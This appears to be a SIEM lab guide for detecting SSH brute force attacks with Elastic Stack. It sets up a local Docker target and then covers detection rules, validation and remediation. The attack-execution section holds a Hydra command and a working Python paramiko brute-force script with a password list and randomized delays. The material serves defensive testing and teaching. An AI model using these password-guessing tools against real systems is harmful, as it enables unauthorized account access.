# Brute Force Attack Detection Scenario

## 1. Attack Overview and Real-world Context

Brute force attacks are a common method used by attackers to gain unauthorized access to systems by systematically attempting many password combinations until finding the correct one. These attacks target authentication mechanisms and can affect various services including SSH, web applications, database servers, and email services.

### Real-world Context

In real-world scenarios, brute force attacks are often used as an initial access vector. Once attackers gain access to a system through a compromised account, they can:
- Escalate privileges
- Move laterally through the network
- Exfiltrate sensitive data
- Deploy malware or ransomware
- Establish persistence for long-term access

Notable examples include:
- The 2013 GitHub attack where attackers used brute force to gain access to accounts with weak passwords
- Multiple WordPress site compromises through brute force attacks against admin accounts
- SSH brute force attacks against internet-facing servers, which are among the most common attacks observed in the wild

## 2. Environment Setup Requirements

### Prerequisites

- Functioning Elastic Stack SIEM deployment as described in the [Deployment Guide](../docker/DEPLOYMENT.md)
- Configured data pipelines for authentication logs
- Configured detection rules for authentication failures
- A test system with SSH enabled (can be a Docker container or VM)

### Test Environment Setup

1. Create a test environment using Docker:

```bash
# Create a simple SSH server container
docker run -d --name ssh-target -p 2222:22 linuxserver/openssh-server
```

2. Create a user with a simple password for testing:

```bash
docker exec -it ssh-target useradd -m testuser
docker exec -it ssh-target bash -c "echo 'testuser:password123' | chpasswd"
```

3. Ensure Filebeat is configured to collect authentication logs from the host system.

4. Configure the Brute Force Attack detection rule in Kibana:
   - Navigate to **Security** > **Detections** > **Manage detection rules**
   - Create a rule with the following settings:
     - Name: `Brute Force Attack Detection`
     - Description: `Detects potential brute force attacks based on failed authentication attempts`
     - Index pattern: `filebeat-*`
     - Query: `tags:authentication_failure`
     - Threshold: Count > 5 grouped by `source.ip` and `user.name` in 5 minutes
     - Schedule: Run every 5 minutes

## 3. Attack Execution Steps

### Method 1: Using Hydra (Automated Tool)

1. Install Hydra if not already available:

```bash
sudo apt-get update
sudo apt-get install -y hydra
```

2. Create a file with potential passwords:

```bash
echo "password123" > passwords.txt
echo "admin123" >> passwords.txt
echo "123456" >> passwords.txt
echo "qwerty" >> passwords.txt
echo "letmein" >> passwords.txt
```

3. Execute the brute force attack:

```bash
hydra -l testuser -P passwords.txt ssh://localhost:2222
```

### Method 2: Using a Custom Python Script

1. Create a Python script for the brute force attack:

```python
#!/usr/bin/env python3
import paramiko
import time
import sys
import random

def ssh_connect(host, port, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=user, password=password, timeout=3)
        print(f"[+] Success! Password found: {password}")
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Authentication failed: {password}")
        return False
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return False
    finally:
        client.close()

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 brute_force.py <username> <host>")
        return
    
    user = sys.argv[1]
    host = sys.argv[2]
    port = 2222
    
    passwords = [
        "password123",
        "admin123",
        "123456",
        "qwerty",
        "letmein",
        "password",
        "admin",
        "welcome",
        "p@ssw0rd",
        "test123"
    ]
    
    print(f"[*] Starting brute force attack against {user}@{host}:{port}")
    
    for password in passwords:
        time.sleep(random.uniform(0.5, 2.0))  # Random delay to simulate human behavior
        if ssh_connect(host, port, user, password):
            break

if __name__ == "__main__":
    main()
```

2. Install the required Python package:

```bash
pip install paramiko
```

3. Run the script:

```bash
python3 brute_force.py testuser localhost
```

### Method 3: Manual Testing (for Demonstration)

For demonstration purposes, you can manually attempt multiple failed logins:

```bash
# Attempt 1
ssh testuser@localhost -p 2222 -o StrictHostKeyChecking=no
# Enter incorrect password: wrong1

# Attempt 2
ssh testuser@localhost -p 2222 -o StrictHostKeyChecking=no
# Enter incorrect password: wrong2

# Continue with more attempts...
```

## 4. Expected Detection Outcomes

### Alerts

The Elastic Stack SIEM should generate alerts based on the configured detection rule when:
- Multiple failed authentication attempts are detected from the same source IP
- The attempts target the same username
- The frequency exceeds the threshold (5 attempts within 5 minutes)

### Dashboard Visualization

The following visualizations should reflect the brute force attack:
- **Authentication Failures Over Time**: Should show a spike during the attack period
- **Top Source IP Addresses**: Should include the attacking IP with a high count of authentication failures
- **Geographic Map**: If GeoIP is configured, should show the location of the attacking IP

### Timeline

The SIEM timeline should show:
1. Initial failed authentication attempts
2. Continued pattern of failures
3. Potential successful authentication (if the correct password was in the list)

## 5. Validation Methods

### Verify Alert Generation

1. Navigate to **Security** > **Alerts** in Kibana
2. Confirm that a "Brute Force Attack Detection" alert was generated
3. Verify that the alert contains:
   - The correct source IP address
   - The targeted username
   - The correct timestamp range
   - The count of failed attempts

### Verify Log Collection

1. Navigate to **Discover** in Kibana
2. Select the `filebeat-*` index pattern
3. Search for `tags:authentication_failure AND user.name:testuser`
4. Verify that the failed authentication attempts were properly collected and indexed

### Verify Dashboard Updates

1. Open the Security Overview dashboard
2. Verify that the Authentication Failures visualization shows the attack activity
3. Check that the Top Source IP Addresses visualization includes the attacking IP

## 6. Remediation Recommendations

Based on the detection of brute force attacks, the following remediation steps are recommended:

### Immediate Actions

1. **Block the attacking IP address**:
   ```bash
   sudo iptables -A INPUT -s <attacking_ip> -j DROP
   ```

2. **Lock the targeted account temporarily**:
   ```bash
   sudo passwd -l <username>
   ```

3. **Check for successful logins following the attack**:
   ```bash
   grep "Accepted password" /var/log/auth.log | grep <username>
   ```

### Long-term Mitigations

1. **Implement account lockout policies**:
   - Configure PAM to lock accounts after multiple failed attempts
   - Example for `/etc/pam.d/common-auth`:
     ```
     auth required pam_tally2.so deny=5 unlock_time=1800
     ```

2. **Implement SSH hardening**:
   - Disable password authentication and use key-based authentication
   - Change the default SSH port
   - Use fail2ban to automatically block IPs with multiple failed attempts

3. **Implement Multi-Factor Authentication (MFA)**:
   - Set up Google Authenticator or another MFA solution for SSH

4. **Regular password policy enforcement**:
   - Require strong, complex passwords
   - Implement regular password rotation
   - Use a password manager for generating and storing strong passwords

## 7. Additional Resources

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [CIS Benchmarks for Secure SSH Configuration](https://www.cisecurity.org/benchmark/ssh)
- [NIST Guidelines on Authentication](https://pages.nist.gov/800-63-3/sp800-63b.html)

## 8. Conclusion

This scenario demonstrates how the Elastic Stack SIEM can detect brute force attacks through log collection, analysis, and alerting. By implementing the proper detection rules and monitoring visualizations, security teams can quickly identify and respond to authentication-based attacks before they result in unauthorized access.

The detection capabilities demonstrated in this scenario can be extended to other authentication systems beyond SSH, including web applications, databases, and cloud services, by configuring the appropriate log sources and detection rules.

